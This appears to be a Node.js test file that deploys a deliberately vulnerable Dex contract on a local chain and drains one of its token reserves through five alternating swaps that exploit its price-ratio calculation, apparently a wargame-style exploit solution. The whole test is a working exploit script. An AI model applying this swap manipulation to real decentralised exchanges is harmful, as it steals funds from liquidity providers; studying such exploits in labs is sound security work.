import { test, beforeEach } from "node:test";
import assert from "node:assert/strict";
import { ethers } from "ethers";
import { readFile } from "node:fs/promises";

const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");

const dexArtifact = JSON.parse(
  await readFile("artifacts/contracts/Dex.sol/Dex.json", "utf8")
);

const tokenArtifact = JSON.parse(
  await readFile("artifacts/contracts/Dex.sol/SwappableToken.json", "utf8")
);

let signer;
let dex;
let token1;
let token2;

beforeEach(async () => {
  signer = await provider.getSigner(1);

  const factory = new ethers.ContractFactory(
    dexArtifact.abi,
    dexArtifact.bytecode,
    signer
  );

  dex = await factory.deploy();
  await dex.waitForDeployment();

  const token1Address = await dex.token1();
  const token2Address = await dex.token2();

  token1 = new ethers.Contract(token1Address, tokenArtifact.abi, signer);
  token2 = new ethers.Contract(token2Address, tokenArtifact.abi, signer);

  await (await dex.approve(await dex.getAddress(), 1000n)).wait();
});

test("drains one of the Dex token reserves using manipulated swap ratios", async () => {
  const dexAddress = await dex.getAddress();

  await (await dex.swap(await token1.getAddress(), await token2.getAddress(), 10n)).wait();
  await (await dex.swap(await token2.getAddress(), await token1.getAddress(), 20n)).wait();
  await (await dex.swap(await token1.getAddress(), await token2.getAddress(), 24n)).wait();
  await (await dex.swap(await token2.getAddress(), await token1.getAddress(), 30n)).wait();
  await (await dex.swap(await token1.getAddress(), await token2.getAddress(), 41n)).wait();

  assert.equal(await token1.balanceOf(dexAddress), 0n);
});
